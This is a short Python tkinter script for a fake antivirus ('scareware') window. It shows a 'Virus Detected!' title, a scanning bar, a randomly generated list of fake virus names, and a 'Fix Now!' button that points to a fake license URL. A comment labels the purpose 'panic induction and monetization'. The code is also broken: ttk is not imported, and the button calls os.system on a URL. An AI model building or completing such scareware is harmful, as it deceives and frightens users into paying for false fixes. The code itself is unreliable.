import tkinter as tk
import os
from random import randint

# Create the GUI window
class FakeAV_GUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Virus Detected!")
        
        # Label and progress bar
        self.label_text = "Scanning..."
        self.progress = tk.ttk.Progressbar(self.master, length=200, mode="determinate", maximum=randint(100, 200))
        self.progress.pack()

        # False positive list
        self.viruses = [f"Virus_{randint(1,10)}" for _ in range(randint(20,40))]

        # Panic induction and monetization steps

        # Fake fix button
        def fake_fix():
            os.system("https://www.example.com/fake-license")

        self.fake_fix_button = tk.Button(self.master, text="Fix Now!", command=fake_fix)
        self.fake_fix_button.pack()

def run_fake_av():
    root = tk.Tk()
    fake_av = FakeAV_GUI(root)
    root.mainloop()

run_fake_av()
